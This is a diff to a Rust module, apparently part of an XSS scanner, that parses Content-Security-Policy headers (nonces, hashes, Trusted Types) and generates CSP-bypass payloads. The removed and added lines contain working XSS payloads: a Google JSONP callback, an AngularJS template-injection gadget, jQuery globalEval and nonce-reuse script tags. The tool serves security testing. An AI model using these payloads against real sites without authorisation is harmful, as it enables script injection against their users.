@@ -6,8 +6,11 @@
 //! - Missing `base-uri`: `<base>` tag injection to redirect relative URLs
 //! - Missing `object-src`: Plugin-based execution
 //! - Whitelisted CDN domains: JSONP/Angular/etc. gadgets on allowed origins
+//!   (sourced from [`crate::payload::gadget_db`])
 //! - `data:` scheme allowed in script-src
-//! - `strict-dynamic` with nonce/hash: Script gadget injection
+//! - `strict-dynamic` with nonce/hash: DOM script-gadget injection + nonce reuse
+//! - `require-trusted-types-for` / `trusted-types`: parsed for awareness so a
+//!   nonce/hash-only CSP is classified hardened-vs-gadget-bypassable
 
 use crate::scanning::markers;
 
@@ -23,6 +26,68 @@ pub struct CspAnalysis {
     pub missing_object_src: bool,
     pub missing_script_src: bool,
     pub whitelisted_domains: Vec<String>,
+    /// Base64 values of every `'nonce-…'` source expression in `script-src`
+    /// (the token between `'nonce-` and the closing quote, case preserved).
+    /// A reflected or otherwise predictable nonce lets an injected
+    /// `<script nonce=…>` execute even under `strict-dynamic`.
+    pub nonce_values: Vec<String>,
+    /// Full `sha256-…` / `sha384-…` / `sha512-…` tokens (without the quotes)
+    /// from `script-src`. Presence marks a hash-pinned CSP.
+    pub hash_values: Vec<String>,
+    /// `true` when `require-trusted-types-for 'script'` is enforced, so the
+    /// browser routes every DOM-XSS sink string through a Trusted Types policy.
+    /// Threaded into the AST DOM analyzer to gate default-policy suppression.
+    pub require_trusted_types_for: bool,
+    /// The `trusted-types` directive's allow-list values when present
+    /// (policy names, plus keywords like `'none'` / `'allow-duplicates'` with
+    /// quotes stripped). `Some(empty)` means `trusted-types;` with no value,
+    /// which forbids creating any policy. `None` means the directive is absent.
+    pub trusted_types: Option<Vec<String>>,
+}
+
+impl CspAnalysis {
+    /// `true` when `script-src` is pinned to nonces and/or hashes — the modern
+    /// allowlist-free shape. On its own this is the *hardened* form; it only
+    /// becomes gadget-bypassable when paired with `strict-dynamic`, a reflected
+    /// nonce, or a whitelisted host (see [`is_gadget_bypassable`]).
+    ///
+    /// [`is_gadget_bypassable`]: CspAnalysis::is_gadget_bypassable
+    pub fn is_nonce_or_hash_based(&self) -> bool {
+        !self.nonce_values.is_empty() || !self.hash_values.is_empty()
+    }
+
+    /// `true` when the script policy is realistically defeatable by a script
+    /// gadget: `unsafe-inline`/`unsafe-eval` (trivially), a `strict-dynamic`
+    /// policy (DOM script-gadget), or a whitelisted host that serves a known
+    /// JSONP/gadget endpoint.
+    ///
+    /// A bare nonce/hash is deliberately *not* treated as bypassable here: a
+    /// per-response random nonce is the hardened shape, and nonce reuse only
+    /// works when the nonce is predictable or reflected — a contingency we
+    /// can't read off the header. (Under `strict-dynamic` we still emit a
+    /// best-effort reuse payload, but that path is gated on `has_strict_dynamic`.)
+    pub fn is_gadget_bypassable(&self) -> bool {
+        if self.missing_script_src || self.has_unsafe_inline || self.has_unsafe_eval {
+            return true;
+        }
+        if self.has_strict_dynamic {
+            return true;
+        }
+        self.whitelisted_domains.iter().any(|d| {
+            crate::payload::gadget_db::gadgets_for_host(d)
+                .next()
+                .is_some()
+        })
+    }
+
+    /// `true` when `script-src` is a genuinely hardened nonce/hash policy with
+    /// no escape hatch we know how to bypass: nonce/hash based, no
+    /// `strict-dynamic`, no `unsafe-*`, and no whitelisted gadget host. Useful
+    /// for reporting/telemetry; the payload generator simply emits nothing
+    /// actionable in this case.
+    pub fn is_hardened(&self) -> bool {
+        self.is_nonce_or_hash_based() && !self.is_gadget_bypassable()
+    }
 }
 
 /// Parse a CSP header value into an analysis struct.
@@ -64,7 +129,17 @@ pub fn analyze_csp(csp_value: &str) -> CspAnalysis {
                     if lower == "blob:" {
                         analysis.allows_blob_scheme = true;
                     }
-                    // Collect whitelisted domains (not keywords)
+                    // `'nonce-<base64>'` — capture the base64 (case-sensitive,
+                    // so read from the original token, not the lowercased one).
+                    if let Some(nonce) = parse_nonce_token(v, &lower) {
+                        analysis.nonce_values.push(nonce);
+                    }
+                    // `'sha256-…'` / `'sha384-…'` / `'sha512-…'`.
+                    if let Some(hash) = parse_hash_token(v, &lower) {
+                        analysis.hash_values.push(hash);
+                    }
+                    // Collect whitelisted domains (not keywords). Nonce/hash
+                    // tokens start with `'` so they're excluded here too.
                     if !lower.starts_with('\'')
                         && lower != "data:"
                         && lower != "blob:"
@@ -92,6 +167,25 @@ pub fn analyze_csp(csp_value: &str) -> CspAnalysis {
             "object-src" => {
                 has_object_src = true;
             }
+            "require-trusted-types-for" => {
+                // The only defined value is `'script'`; its presence enforces
+                // Trusted Types on DOM-XSS sinks.
+                for v in &values {
+                    if v.trim_matches('\'').eq_ignore_ascii_case("script") {
+                        analysis.require_trusted_types_for = true;
+                    }
+                }
+            }
+            "trusted-types" => {
+                // Record the allow-list (policy names / keywords, quotes
+                // stripped). `trusted-types;` with no value → `Some(empty)`.
+                let collected: Vec<String> = values
+                    .iter()
+                    .map(|s| s.trim_matches('\'').to_string())
+                    .filter(|s| !s.is_empty())
+                    .collect();
+                analysis.trusted_types = Some(collected);
+            }
             _ => {}
         }
     }
@@ -101,6 +195,32 @@ pub fn analyze_csp(csp_value: &str) -> CspAnalysis {
     analysis.missing_object_src = !has_object_src;
 
     analysis
+}
+
+/// Extract the base64 payload of a `'nonce-<base64>'` source expression. The
+/// nonce is case-sensitive, so it is sliced from the original `token` while the
+/// already-lowercased `lower` drives the (case-insensitive) prefix/suffix match.
+fn parse_nonce_token(token: &str, lower: &str) -> Option<String> {
+    const PREFIX: &str = "'nonce-";
+    if lower.starts_with(PREFIX) && lower.ends_with('\'') && token.len() > PREFIX.len() {
+        let inner = &token[PREFIX.len()..token.len() - 1];
+        if !inner.is_empty() {
+            return Some(inner.to_string());
+        }
+    }
+    None
+}
+
+/// Extract a `sha256-…` / `sha384-…` / `sha512-…` token (algorithm prefix kept,
+/// surrounding quotes dropped) from a hash source expression.
+fn parse_hash_token(token: &str, lower: &str) -> Option<String> {
+    let is_hash = lower.starts_with("'sha256-")
+        || lower.starts_with("'sha384-")
+        || lower.starts_with("'sha512-");
+    if is_hash && lower.ends_with('\'') && token.len() > 2 {
+        return Some(token[1..token.len() - 1].to_string());
+    }
+    None
 }
 
 /// Generate CSP bypass payloads based on CSP analysis.
@@ -198,43 +318,62 @@ pub fn get_csp_bypass_payloads(analysis: &CspAnalysis) -> Vec<String> {
         ));
     }
 
-    // Known CDN JSONP/gadget endpoints on whitelisted domains
-    for domain in &analysis.whitelisted_domains {
-        let d = domain.to_ascii_lowercase();
-        // Google CDN / APIs — common JSONP endpoints
-        if d.contains("googleapis.com") || d.contains("google.com") || d.contains("gstatic.com") {
+    // Script gadgets. `strict-dynamic` makes the browser *ignore* the host
+    // allowlist, so a plain `<script src=allowed-host>` no longer loads — only
+    // DOM script-gadgets (a trusted script creating the attacker script) and
+    // nonce reuse survive. Without `strict-dynamic`, a whitelisted host that
+    // serves a JSONP/gadget endpoint is directly loadable.
+    if analysis.has_strict_dynamic {
+        // Nonce reuse: an injected <script> bearing a captured nonce executes
+        // when that nonce is static / predictable / reflected into the sink.
+        // The nonce value is quoted: base64 nonces routinely contain `=` (and
+        // sometimes `+`/`/`), which are invalid in an unquoted HTML attribute
+        // value and would truncate the nonce so it no longer matches the CSP.
+        for nonce in &analysis.nonce_values {
             payloads.push(format!(
-                "<script src=\"https://www.google.com/complete/search?client=chrome&q=xss&callback=alert\" class={}></script>",
-                class_marker
+                "<script nonce=\"{}\" class={}>alert(1)</script>",
+                nonce, class_marker
+            ));
+            payloads.push(format!(
+                "<script nonce=\"{}\" src=\"data:text/javascript,alert(1)\" id={}></script>",
+                nonce, id_marker
             ));
         }
-        // Angular CDN — template injection via Angular bootstrap
-        if d.contains("angularjs.org")
-            || d.contains("angular")
-            || d.contains("cdnjs.cloudflare.com")
-        {
-            payloads.push(format!(
-                "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js\" class={}></script><div ng-app ng-csp>{{{{$eval.constructor('alert(1)')()}}}}</div>",
-                class_marker
+        // DOM script-gadgets that survive strict-dynamic.
+        for gadget in crate::payload::gadget_db::strict_dynamic_gadgets() {
+            payloads.push(crate::payload::gadget_db::render(
+                gadget.template,
+                class_marker,
+                id_marker,
             ));
         }
-        // jQuery CDN
-        if d.contains("jquery") || d.contains("code.jquery.com") {
-            payloads.push(format!(
-                "<script src=\"https://code.jquery.com/jquery-3.6.0.min.js\" class={}></script><img src=x onerror=$.globalEval('alert(1)')>",
-                class_marker
-            ));
-        }
-        // unpkg / jsdelivr — universal gadget
-        if d.contains("unpkg.com") || d.contains("jsdelivr.net") {
-            payloads.push(format!(
-                "<script src=\"https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js\" class={}></script><div ng-app ng-csp>{{{{$eval.constructor('alert(1)')()}}}}</div>",
-                class_marker
-            ));
+    } else {
+        // Host-allowlist CSP: emit the gadgets whose host pattern matches an
+        // allowed origin (replaces the former hardcoded CDN branches).
+        for domain in &analysis.whitelisted_domains {
+            for gadget in crate::payload::gadget_db::gadgets_for_host(domain) {
+                payloads.push(crate::payload::gadget_db::render(
+                    gadget.template,
+                    class_marker,
+                    id_marker,
+                ));
+            }
         }
     }
 
+    dedup_preserve_order(payloads)
+}
+
+/// De-duplicate payloads while preserving first-occurrence order. The gadget DB
+/// can yield the same template for several matching host patterns (e.g. a
+/// `jquery`/`ajax.googleapis.com` double match), so collapse repeats to keep the
+/// per-parameter request count from growing.
+fn dedup_preserve_order(payloads: Vec<String>) -> Vec<String> {
+    let mut seen = std::collections::HashSet::with_capacity(payloads.len());
     payloads
+        .into_iter()
+        .filter(|p| seen.insert(p.clone()))
+        .collect()
 }
 
 #[cfg(test)]
